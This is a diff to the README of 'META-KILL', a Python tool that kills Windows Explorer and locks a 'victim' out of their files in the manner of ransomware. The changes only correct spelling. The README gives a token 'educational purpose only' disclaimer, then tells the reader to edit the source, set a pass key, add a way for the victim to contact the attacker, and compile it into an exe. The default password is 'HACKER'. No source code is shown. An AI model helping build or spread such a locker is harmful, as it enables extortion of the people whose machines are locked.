@@ -1,14 +1,14 @@
 # META-KILL
-This tool looks like ransomware but it's not , it's a tool which kill the windows explorer, makes your victim ineligible and has no ability to access his all files and data
+This tool looks like ransomware but it's not , it's a tool which kill the windows explorer, makes your victim ineligible and has no ability to access all his files and data
 # RemeberThat 
-This tool is for educational purpose only and not to make people make cyber attacks on each other. I am not responsible for any harmful use or any harmful use that leads to imprisonment and military court.
+This tool is for educational purpose only and not to make people make cyber attacks on each other. I am not responsible for any harmful use or any bad usage which leads to imprisonment and military court.
 # Usage
- You can install the file on your device bt dont run it untill u know the defult password is " HACKER " in case u run it by wrong don't forget it
+ You can install the file on your device but don't run it until you know the defult password is " HACKER " in case u run it by wrong don't forget it
  1. First download the META-KILL.py
  2. Open it via vs code ( https://code.visualstudio.com/ )
  3. You will find the source code then modify it as u need regardless the GUI Design or pass key and put the way of how victim communicate with you
  # Setup your exe 
- in case u fishished modify on the source code u want to change the file into exe file 
+ in case u fishished modify on the source code you want to change the file into exe file 
  here is the steps 
  1. Open your cmd "win+R" then write cmd 
  ![image](https://user-images.githubusercontent.com/88976173/214572096-448301ba-db35-4d00-a9bd-758cceacb00c.png)
